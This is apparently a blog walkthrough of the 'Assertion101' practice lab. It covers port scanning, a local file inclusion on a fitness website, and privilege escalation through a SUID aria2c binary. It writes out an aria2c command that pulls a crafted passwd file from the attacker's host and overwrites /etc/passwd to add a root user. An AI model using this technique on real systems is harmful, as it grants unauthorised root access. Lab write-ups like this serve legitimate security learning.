---
title: "Assertion101"
date: 2024-11-03T10:24:00
draft: false
tags: ["LFI", "SUID exploitation"]
---

Recon :

a quick rustscan to find open ports on the target

![Image 1](/images/1.png)

Scanning :  
then a nmap scan for banner grabbing for the open ports

![Image 2](/images/2.png)

Enumeration : 

From the nmap scan, we could deduce that OS runs Linux and specifically.
```# Nmap 7.94SVN scan initiated Thu Oct 24 18:25:45 2024 as: /usr/lib/nmap/nmap -p 22,80 -sCV -oN assertion.txt 192.168.170.94
Nmap scan report for 192.168.170.94
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Assertion
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 24 18:25:54 2024 -- 1 IP address (1 host up) scanned in 8.80 seconds
```


There is an Apache web server running, would enumerate it.

The website is about fitness. 

![Image 3](/images/3.png)

Fuzzing for hidden endpoints 

![Image 4](/images/4.png)

/pages shows this PHP files.

![Image 5](/images/5.png)

From the main page, clicked on the about-us 

![Image 6](/images/6.png)

Test for LFI  
![Image 7](/images/7.png)

Using payload of `/etc/passwd`, there is an error "file does not exist"

Could try other payloads or automate it by fuzzing.. 

While manually trying different payloads and methodologies, the box creator sends us messages.. 

Will continue testing..

Tried everything I knew but was futile, reading over StackOverflow, someone talked about this attack, 

Simple detailed explanation on how it works.. 

![Image 8](/images/8.png)

Going 1 step from the HTML directory, the `local.txt` file 

![Image 9](/images/9.png)

Next, to attempt privilege escalation to the user..

Importing linpeas 

![Image 10](/images/10.png)

There is an unknown binary, will enumerate more..

![Image 11](/images/11.png)

Great

![Image 12](/images/12.png)

The `/usr/bin/aria2c` executable, which is a command line download utility. We can use it to overwrite some important files. For example, we can use it to overwrite the root’s `authorized_keys` file.

It can be used to read files as well or 

![Image 13](/images/13.png)

Read it normally..  
![Image 14](/images/14.png)

In this scenario, will copy the existing `passwd` file and add a new user with root rights and copy to the target to the `/etc` directory using the aria2c binary.

![Image 15](/images/15.png)

`/usr/bin/aria2c -o passwd "http://192.168.45.219:8000/newpass" --allow-overwrite=true
`

![Image 16](/images/16.png)

Then switch user to Tom and enter the password (`Password@973`)

![Image 17](/images/17.png)

Got the last flag.. 

Thanks for reading..
